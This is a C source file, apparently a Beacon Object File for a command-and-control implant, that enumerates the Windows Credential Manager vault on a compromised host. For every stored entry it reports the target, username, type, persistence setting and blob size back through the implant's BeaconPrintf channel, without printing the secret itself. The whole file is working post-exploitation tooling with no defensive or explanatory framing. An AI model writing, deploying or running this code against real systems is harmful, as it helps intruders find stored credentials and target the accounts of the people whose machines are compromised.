/*
 * vault_enum.c - Windows Credential Manager enumeration
 * Finds stored credentials in Windows Vault
 */
#include <windows.h>
#include <stdio.h>
#include <wincred.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$CredEnumerateA(LPCSTR, DWORD, DWORD*, PCREDENTIALA**);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI ADVAPI32$CredFree(PVOID);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    DWORD count = 0;
    PCREDENTIALA* creds = NULL;

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &count, &creds)) {
        BeaconPrintf(CALLBACK_OUTPUT, "No credentials in vault or access denied");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "=== Credential Vault (%lu entries) ===", count);

    for (DWORD i = 0; i < count; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "--- Credential %lu ---", i);
        BeaconPrintf(CALLBACK_OUTPUT, "  Target    : %s", creds[i]->TargetName);
        BeaconPrintf(CALLBACK_OUTPUT, "  Username  : %s", creds[i]->UserName ? creds[i]->UserName : "(none)");
        BeaconPrintf(CALLBACK_OUTPUT, "  Type      : %lu", creds[i]->Type);
        BeaconPrintf(CALLBACK_OUTPUT, "  Persist   : %lu", creds[i]->Persist);

        if (creds[i]->CredentialBlob && creds[i]->CredentialBlobSize > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size : %lu bytes", creds[i]->CredentialBlobSize);
        }
    }

    ADVAPI32$CredFree(creds);
}
